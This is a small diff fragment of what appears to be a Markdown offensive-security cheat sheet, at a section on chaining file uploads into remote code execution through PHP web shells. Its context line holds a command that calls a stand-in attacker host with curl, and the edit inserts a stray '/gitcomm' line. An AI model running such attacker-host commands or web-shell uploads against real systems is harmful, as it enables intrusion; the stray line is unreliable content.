@@ -585,7 +585,7 @@ sleep 10 && curl http://attacker.com/confirmed
 ### File Upload → RCE Chains
 
 #### 1. Web Shell Upload
-
+/gitcomm
 **PHP Web Shells:**
 
 ```php
